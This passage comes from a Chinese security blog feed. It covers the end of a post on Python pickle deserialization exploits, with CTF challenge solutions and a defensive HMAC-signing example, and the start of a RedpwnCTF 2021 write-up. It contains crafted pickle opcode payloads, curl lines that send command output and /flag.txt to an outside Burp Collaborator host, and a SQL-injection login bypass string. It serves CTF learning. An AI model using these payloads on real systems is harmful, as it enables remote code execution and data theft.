style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># 缝合 应该能看出来改在哪里了&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">flagi__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811195932427.png" alt="image-20210811195932427">&lt;/p>
&lt;h2 id="一些小技巧注意事项">一些小技巧&amp;amp;注意事项&lt;/h2>
&lt;ul>
&lt;li>当把payload作为get参数请求时，url编码注意换行符是%0A而不是%0D%0A&lt;/li>
&lt;li>对payload进行b64加密时，注意别把\n给单独编码了（不过正常都不会）&lt;/li>
&lt;li>其他模块的load也可以触发pickle反序列化漏洞&lt;/li>
&lt;/ul>
&lt;p>例如：&lt;code>numpy.load()&lt;/code>先尝试以numpy自己的数据格式导入，如果失败，则尝试以pickle的格式导入；&lt;code>pandas.read_pickle()&lt;/code>直接使用&lt;code>pickle.load()&lt;/code>方法&lt;/p>
&lt;ul>
&lt;li>灵活运用&lt;u>&lt;strong>burp collaborator&lt;/strong>&lt;/u>&lt;/li>
&lt;/ul>
&lt;p>虽然我们不能把burp提供的collaborator当作vps来使用，进行反弹shell然后一通操作，但是我们可以利用反引号+curl的方式直接获得代码执行和结果的输出；curl本身的用法也很多，可以直接带文件进行post，更多内容参见：&lt;a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 基操1&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`)&lt;/span>
&lt;span style="color:#75715e"># 基操2 -d参数可以读取本地文件内容作为数据体发送，会自动添加请求头并调整请求方法 无需-X POST&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl -d &amp;#39;&lt;/span>&lt;span style="color:#f92672">@/&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39; http://xxxx.burpcollaborator.net/)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="最后出于安全角度的考量">最后，出于安全角度的考量&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>禁用pickle，使用Json或Google Protocol Buffers&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当确实需要使用pickle时，要确保对用户的输入进行过滤，比如重写&lt;code>find_class()&lt;/code>（使用白名单而不是黑名单进行过滤）、禁止某些操作符；由于在对opcode进行反序列化时可能会造成任意文件读写，一定提前对重要文件做好权限的管理；必要时可以对信息进行hmac签名&lt;/p>
&lt;/li>
&lt;li>
&lt;p>举一个hmac的栗子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hmac&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__str__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;My name is &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">, I am &lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200"> years old.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HMAC_Pickler&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">seperator&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">signer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hmac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">):]&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Data is tampered by someone.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s%s%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sign&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f&amp;#39;&lt;/span>
&lt;span style="color:#111">pickler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HMAC_Pickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Jack&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;I am hacker, trying evil things&amp;#34;&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子9 - [BalsnCTF 2019] Pyshv3
&lt;/h4>
&lt;/summary>
&lt;p>这次的find_class()没有变化，但是structs有具体的实现&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812012841569.png" alt="image-20210812012841569">&lt;/p>
&lt;p>同时server.py的逻辑也发生了变化，不用rce了，直接有一个拿flag的函数，但需要self.user.privileged为True才可以返回&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013032487.png" alt="image-20210812013032487">&lt;/p>
&lt;p>而这个self.user.privileged在一开始就被设为了False&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013115089.png" alt="image-20210812013115089">&lt;/p>
&lt;p>emmmm 这怎么绕过捏？&lt;/p>
&lt;p>先说非预期，将&lt;code>__builtins__&lt;/code>复制到modules属性上；再说说预期解。&lt;/p>
&lt;p>我们知道，有&lt;code>__get__&lt;/code>，&lt;code>__set__&lt;/code>这样描述器协议方法的对象称为描述器descriptor。默认对属性的访问控制都是从对象的字典__dict__里面进行获取(get)，设置(set)和删除(delete)的方法（前面的那道题也用到这个点）。举例来说，&lt;code>a.x&lt;/code>的查找顺序是&lt;code>a.__dict__['x']&lt;/code>，之后&lt;code>type(a).__dict__['x']&lt;/code>，然后找type(a)的父类。如果查找到的值是一个描述器，python就会调用描述器的方法来重写默认的控制行为，这个重写发生在这个查找环节的哪里取决于定义了哪个描述器方法。（注意：只有在新式类中时描述器才起作用）（更多介绍参见：&lt;a href="https://foofish.net/what-is-descriptor-in-python.html">什么是描述符（descriptor）&lt;/a>）&lt;/p>
&lt;p>我们利用描述器的特性，将User类的&lt;code>__set__&lt;/code>方法重载为structs.User，并把它的privileged属性赋值为一个User实例。当进行self.user.privileged被赋值时触发&lt;code>__set__&lt;/code>，但由于已经被重写，所以并不会被赋值False，而是保持原样，还是一个User实例。在后面if判断时，User实例当然是True，就可以绕过了。&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__set__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">privileged&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\nUser\np0\n0g0\n(}(S'__set__'\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S'privileged'\ng2\ndtbg2\n.&amp;quot;
&lt;/code>&lt;/pre>&lt;/details>
&lt;p>考虑到这个题更综合了python的相关特性，所以把这个题放在最后。&lt;/p>
&lt;hr>
&lt;p>从新建文件到写完用了几天时间，细细地整理相关知识，也算是对反序列化这个知识点的认识清晰了不少。还有一个PyYAML的反序列化问题，由于篇幅问题拆开来放到下一篇中。自认为总结的还是比较详细的（嘿嘿x）不过肯定还有不周到的地方，之后如遇到更多知识还会进行补充。&lt;/p>
&lt;p>自己还是有惰性啊，其实反序列化第一篇总结的是php，可是到现在还有几个二级标题下面是空白的……只能先给自己找个借口：php反序列化的东西实在是太多了TAT&lt;/p>
&lt;hr>
&lt;p>最后放一下全篇用到的的参考文章（部分已写在对应标题下面），不分先后~&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/wjrblogs/p/14057784.html">Python 反序列化漏洞学习笔记&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你理解漏洞之 Python 反序列化漏洞&lt;/a> | &lt;a href="https://xz.aliyun.com/t/7436#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2">pickle反序列化初探&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188981#h2-10">Python pickle 反序列化实例分析&lt;/a> | &lt;a href="https://segmentfault.com/a/1190000013099825">Python 反序列化安全问题（一）&lt;/a> - &lt;a href="https://segmentfault.com/a/1190000013214956">Python 反序列化安全问题（二）&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp;amp; 不用reduce的RCE姿势&lt;/a> | &lt;a href="https://blog.csdn.net/weixin_39929635/article/details/111003485">关于Python sec的一些简单的总结&lt;/a> | &lt;a href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">Sour Pickles A serialised exploitation guide in one part - Macro Slaviero&lt;/a> | &lt;a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#">🐍 Security Issues in Python Pickle&lt;/a>&lt;/p></description></item><item><title>RedpwnCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/</link><pubDate>Sun, 08 Aug 2021 20:08:39 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/</guid><description>&lt;p>官方的docker地址~~复现一本满足~&lt;a href="https://github.com/redpwn/redpwnctf-2021-challenges">https://github.com/redpwn/redpwnctf-2021-challenges&lt;/a>&lt;/p>
&lt;h2 id="webinspect-me">web/inspect-me&lt;/h2>
&lt;blockquote>
&lt;p>See if you can find the flag in the source code!&lt;/p>
&lt;p>&lt;a href="https://inspect-me.mc.ax/">inspect-me.mc.ax&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092212510.png" alt="image-20210710092212510">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092254315.png" alt="image-20210710092254315">&lt;/p>
&lt;h2 id="weborm-bad">web/orm-bad&lt;/h2>
&lt;blockquote>
&lt;p>I just learned about orms today! They seem kinda difficult to implement though&amp;hellip; Guess I&amp;rsquo;ll stick to good old raw sql statements!&lt;/p>
&lt;p>&lt;a href="https://orm-bad.mc.ax/">orm-bad.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/eb4c66c15fe3013340068ef0a34bd5dd5c0c98c567fac53b158d56afe07b511c/app.js">app.js&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>万能密码：admin&amp;rsquo;or'1 : admin&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092643161.png" alt="image-20210710092643161">&lt;/p>
&lt;p>关于orm 之后要补一下知识：&lt;a href="https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping">Object–relational mapping&lt;/a> &lt;a href="http://www.ruanyifeng.com/blog/2019/02/orm-tutorial.html">ORM 实例教程&lt;/a>&lt;/p>
&lt;h2 id="websecure">web/secure&lt;/h2>
&lt;blockquote>
&lt;p>Just learned about encryption—now, my website is unhackable!&lt;/p>
&lt;p>&lt;a href="https://secure.mc.ax/">secure.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/210a9fe526e420576e4b6c1cb74eeed437c1a89955c8158c14aa365c45578200/index.js">index.js&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>还是个登录框，尝试万能密码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094442324.png" alt="image-20210710094442324">&lt;/p>
&lt;p>源码是这样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;crypto&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;better-sqlite3&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;db.sqlite3&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`DROP TABLE IF EXISTS users;`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`CREATE TABLE users(
&lt;/span>&lt;span style="color:#d88200"> id INTEGER PRIMARY KEY AUTOINCREMENT,
&lt;/span>&lt;span style="color:#d88200"> username TEXT,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200">);`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`INSERT INTO users (username, password) VALUES (
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">randomUUID&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">)`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
